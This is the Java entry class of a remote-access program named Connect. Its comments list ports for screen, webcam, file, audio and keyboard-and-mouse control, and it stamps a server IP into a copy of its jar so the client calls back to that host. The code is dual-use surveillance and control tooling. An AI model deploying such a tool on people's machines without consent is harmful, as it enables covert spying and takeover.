package br.com.introcdc.connect;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:29
 */

import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.server.ConnectServer;
import com.github.sarxos.webcam.Webcam;

import java.io.*;
import java.util.concurrent.TimeUnit;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

public class Connect {

    /*
    Portas:
        PORT: Porta principal, transmissão de texto
        PORT + 1: Transmissão de tela (estática ou streaming)
        PORT + 2: Transmissão de webcam (estática ou streaming)
        PORT + 3: Transmissão de arquivos (cliente para servidor)
        PORT + 4: Transmissão de arquivos (servidor para cliente)
        PORT + 5: Transmissão de imagem (visualização de imagem)
        PORT + 6: Transmissão do control remoto (controle de teclado e mouse)
        PORT + 7: Transmissão de áudio (cliente para servidor)
        PORT + 8: Transmissão de áudio (servidor para cliente)
        PORT + 9: Transmissão de tela para ícone
        PORT + 10: Transmissão de webcam para ícone
     */
    public static String IP = "127.0.0.1";
    public static final int PORT = 12345;

    public static void main(String[] args) {
        try {
            System.setProperty("org.slf4j.simpleLogger.log.com.github.sarxos.webcam", "ERROR");
            Webcam.getDefault();
        } catch (Exception ignored) {
        }

        String ip;
        if (args.length == 1) {
            IP = args[0];
        } else if ((ip = readJar()) != null) {
            IP = ip;
        }
        if (!FileComponents.getFileName().equalsIgnoreCase("ConnectServer.jar")) {
            ConnectClient.startClient(args.length > 0);
        } else {
            ConnectServer.startServer();
        }
    }

    public static boolean saveJar(File jarFile, String ip) {
        try {
            File newJar = new File("connect/Connect.jar");
            try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarFile));
                 ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(newJar))) {

                ZipEntry entry;
                while ((entry = zis.getNextEntry()) != null) {
                    zos.putNextEntry(new ZipEntry(entry.getName()));
                    if (!entry.isDirectory()) {
                        byte[] buffer = new byte[1024];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            zos.write(buffer, 0, len);
                        }
                    }
                    zos.closeEntry();
                }

                String newFileName = "ip.txt";
                zos.putNextEntry(new ZipEntry(newFileName));
                zos.write(ip.getBytes());
                zos.closeEntry();
            }
            return true;
        } catch (Exception ignored) {
        }
        return false;
    }

    public static String readJar() {
        try {
            File jarFile = new File(FileComponents.getFileName());

            try (JarFile jar = new JarFile(jarFile)) {
                String fileName = "ip.txt";
                JarEntry entry = jar.getJarEntry(fileName);

                if (entry != null) {
                    try (InputStream is = jar.getInputStream(entry);
                         BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {

                        String line;
                        while ((line = reader.readLine()) != null) {
                            return line;
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    public static int DELAY = 100;
    public static TimeUnit DELAY_TYPE = TimeUnit.MILLISECONDS;

}
